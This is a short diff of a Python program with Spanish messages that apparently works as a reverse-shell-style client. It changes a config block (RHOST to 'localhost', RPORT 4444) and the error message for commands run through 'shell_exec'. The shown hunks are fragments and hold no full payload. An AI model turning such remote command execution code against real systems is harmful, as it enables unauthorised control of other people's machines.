@@ -53,7 +53,7 @@ for _ in range(64):
 
 class config(object):
 
-    RHOST = '127.0.0.1'
+    RHOST = 'localhost'
     RPORT = 4444
     LIMIT = 0 # 0 Es infinito
     #timeout = 180 # 3 minutos
@@ -347,7 +347,7 @@ def main():
 
                             except Exception as Except:
 
-                                data = 'Ocurrio una Excepción al ejecutar "{}". Excepción: "{}"'.format(' '.join(shell_exec), Except)
+                                data = 'Ocurrio una Excepción al ejecutar "{}". Excepción: "{}"'.format(shell_exec, Except)
 
                     elif (cmd[:2].lower() == 'cd'):
 
